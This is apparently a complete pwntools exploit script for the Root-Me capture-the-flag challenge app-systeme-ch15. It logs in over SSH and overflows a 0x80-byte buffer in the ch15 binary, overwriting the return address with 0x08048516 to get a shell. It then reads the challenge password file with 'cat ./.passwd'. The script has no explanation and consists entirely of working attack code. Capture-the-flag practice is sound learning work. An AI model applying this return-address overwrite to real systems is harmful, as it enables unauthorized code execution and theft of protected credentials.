from pwn import *

context.log_level = "error"
s = ssh("app-systeme-ch15", "challenge02.root-me.org", 2222, "app-systeme-ch15")
p = s.run("./ch15")

p.sendline(b"A"*0x80 + p32(0x08048516))
p.sendlineafter(b"app-systeme-ch15-cracked@challenge02:~$ ", b"cat ./.passwd")

print(p.recvline()[:-1].decode())
